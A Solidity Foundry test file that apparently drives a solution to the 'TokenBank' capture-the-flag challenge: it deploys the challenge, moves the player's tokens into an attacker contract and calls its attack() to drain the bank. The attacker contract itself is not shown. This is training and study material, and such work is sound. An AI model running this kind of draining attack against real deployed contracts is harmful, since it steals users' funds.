// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        SimpleERC223Token token = tokenBankChallenge.token();
    
        // Transfer player's tokens to the attacker contract
        vm.startPrank(player);
        uint256 playerBalance = token.balanceOf(player);
        console2.log("Initial Challenge Balance: ", token.balanceOf(address(tokenBankChallenge)));
        // require(playerBalance > 0, "Player should have tokens");
        token.transfer(address(tokenBankAttacker), playerBalance);
        vm.stopPrank();

        // Execute the attack
        tokenBankAttacker.attack();

        _checkSolved();
        console2.log("Initial Challenge Balance: ", token.balanceOf(address(tokenBankChallenge)));
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
